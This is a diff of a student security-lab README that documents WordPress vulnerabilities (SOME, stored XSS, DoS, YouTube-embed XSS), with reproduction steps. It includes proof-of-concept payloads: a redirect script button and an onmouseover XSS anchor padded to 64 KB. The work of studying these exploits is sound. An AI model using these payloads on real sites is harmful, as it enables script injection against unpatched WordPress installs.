@@ -15,6 +15,7 @@ Exploit 1. CVE-2016-4566 Upload Same Origin Method Execution (SOME)
   - [ ] GIF Walkthrough: https://github.com/oleksandrbi/CodePathweek7/blob/master/exploit1.gif
   - [ ] Steps to recreate: 
         1. Reply to an existing comment
+        
         2. Using Javascript use the following code:
             <button onclick="fire()">Click</button>
             <script>
@@ -23,7 +24,9 @@ Exploit 1. CVE-2016-4566 Upload Same Origin Method Execution (SOME)
               setTimeout('location="http://example.com/wp-admin/plugin-install.php?tab=plugin-information&plugin=wp-super-cache&TB_iframe=true&width=600&height=550"')
             }
             </script>
+            
         3. The following script will use an exploit that will create a malicious button that when clicked will take the user to a fake    website example.com
+        
   - [ ] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/changeset/37382/)
     
@@ -35,15 +38,19 @@ Exploit 2. CVE-2015-3440 Unauthenticated Stored Cross Site-Scripting (XSS)
   - [ ] GIF Walkthrough: https://github.com/oleksandrbi/CodePathweek7/blob/master/exploit2.gif
   - [ ] Steps to recreate: 
         1. Create a new post
+        
         2. In the post body, write this code:
             a) It must contain an XSS injection content, followed by at least 64 kilobytes of text
                 Example: 
                     <a title='x onmouseover=alert(unescape(/hello%20world/.source))
                     style=position:absolute;left:0;top:0;width:5000px;height:5000px
                     AAAAAAAA.. (for 64 kb)....AAAAAA
+                    
         3. Save and reload the site
+        
         4. WordPress will truncate the comment allowing the injected content to be posted on the site
             a) A pop up message of "Hello World" will pop up on mouse move
+            
   - [ ] Affected source code:
     - [Link 2](https://core.trac.wordpress.org/changeset/32299)
     - [Link 2.1] (https://www.exploit-db.com/exploits/36844/)
@@ -66,9 +73,9 @@ Exploit 3. CVE-2018-6389 Application Denial of Service (DoS)
     
 Expoint 4: CVE-2017-6817 Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
   - [ ] Summary: 
-    - Vulnerability types:
-    - Tested in version:
-    - Fixed in version: 
+    - Vulnerability types:  Cross-Site Scripting (XSS)
+    - Tested in version: 4.2
+    - Fixed in version: 4.7.3
   - [ ] GIF Walkthrough: 
   - [ ] Steps to recreate: 
         1. Create a new post
@@ -77,7 +84,8 @@ Expoint 4: CVE-2017-6817 Authenticated Stored Cross-Site Scripting (XSS) in YouT
         3. Save your changes, when you go to the post on the site you will see an embeded link
         4. Click the embeded link and a alert window will pop up with the message “No Body Is Safe!”
   - [ ] Affected source code:
-    - [Link 4](https://wpvulndb.com/vulnerabilities/8768)
+    - [Link 4](https://wpvulndb.com/vulnerabilities/8768) 
+    
 ## Assets
 
 List any additional assets, such as scripts or files
